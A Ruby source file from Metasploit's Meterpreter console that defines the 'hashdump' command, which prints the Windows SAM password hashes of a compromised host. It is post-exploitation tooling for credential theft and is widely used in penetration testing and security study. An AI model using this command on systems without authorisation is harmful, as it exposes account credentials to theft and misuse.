# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The password database portion of the privilege escalation extension.
#
###
class Console::CommandDispatcher::Priv::Passwd

	Klass = Console::CommandDispatcher::Priv::Passwd

	include Console::CommandDispatcher

	#
	# List of supported commands.
	#
	def commands
		{
			"hashdump" => "Dumps the contents of the SAM database"
		}
	end

	#
	# Name for this dispatcher.
	#
	def name
		"Priv: Password database"
	end

	#
	# Displays the contents of the SAM database
	#
	def cmd_hashdump(*args)
		client.priv.sam_hashes.each { |user|
			print_line("#{user}")
		}

		return true
	end

end

end
end
end
end
